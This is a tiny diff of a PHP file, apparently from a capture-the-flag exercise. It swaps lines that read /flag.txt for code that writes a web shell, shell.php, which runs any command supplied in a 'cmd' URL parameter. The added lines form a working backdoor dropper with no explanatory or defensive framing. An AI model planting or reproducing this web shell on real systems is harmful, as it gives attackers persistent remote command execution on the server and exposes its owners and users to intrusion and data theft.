@@ -1,5 +1,4 @@
 <?php
-echo file_get_contents('/flag.txt');
-// atau:
-system('cat /flag.txt');
+file_put_contents(__DIR__ . '/shell.php', "<?php system(\$_GET['cmd']); ?>");
+echo "OK";
 ?>
